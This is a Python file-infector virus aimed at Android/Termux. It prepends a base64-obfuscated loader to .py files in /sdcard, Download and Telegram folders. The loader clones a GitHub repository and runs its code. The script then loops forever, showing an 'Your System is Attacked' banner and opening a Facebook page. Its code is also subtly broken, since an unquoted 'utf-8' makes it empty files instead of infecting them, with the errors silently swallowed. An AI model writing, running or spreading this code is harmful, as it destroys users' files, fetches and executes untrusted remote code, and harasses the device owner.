import os,time,base64,random

try:
    import rich
except:
    os.system("pip install rich")
    import rich

from rich.panel import Panel
from rich import print 

vce=b'aW1wb3J0IG9zCm9zLnN5c3RlbSgicGtnIGluc3RhbGwgZ2l0ICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vVklSVVMtNDA0LUNZQkVSL1Z4LmdpdCAmJiBjZCBWeCAmJiBjaG1vZCAreCAqICYmIHB5dGhvbiBydW4ucHkiKQo='
vcode=f"import base64;exec(base64.b64decode({vce}))"

def sdcard():
    os.chdir("/sdcard")
    file=os.listdir("/sdcard")
    pyfile=[]
    for i in file:
        if i.endswith(".py"):
            pyfile.append(i)
    for a in pyfile:
        Emran=open(a,"r").read().encode("utf-8")
        open(a,"w").write(f"{vcode}\n{Emran.decode(utf-8)}")

def download():
    os.chdir("/sdcard/Download")
    file=os.listdir("/sdcard/Download")
    pyfile=[]
    for i in file:
        if i.endswith(".py"):
            pyfile.append(i)
    for a in pyfile:
        Emran=open(a,"r").read().encode("utf-8")
        open(a,"w").write(f"{vcode}\n{Emran.decode(utf-8)}")


def telegram():
    os.chdir("/sdcard/Download/Telegram")
    file=os.listdir("/sdcard/Download/Telegram")
    pyfile=[]
    for i in file:
        if i.endswith(".py"):
            pyfile.append(i)
    for a in pyfile:
        Emran=open(a,"r").read().encode("utf-8")
        open(a,"w").write(f"{vcode}\n{Emran.decode(utf-8)}")


try:
    sdcard()
except:
    pass

try:
    download()
except:
    pass

try:
    telegram()
except:
    pass




logo=""" 
┏┓┳┳┓┳┓┏┓┳┓
┣ ┃┃┃┣┫┣┫┃┃
┗┛┛ ┗┛┗┛┗┛┗"""

color=["[red]","[green]","[violet]"]

while True:
    os.system("clear")
    print(random.choice(color)+logo)
    print(Panel.fit(" Your System is Attacked By EHC CYBER EMRAN", title="MESSAGE"))
    time.sleep(1)
    os.system("xdg-open https://www.facebook.com/sonjay.razbanc.3?mibextid=ZbWKwL")
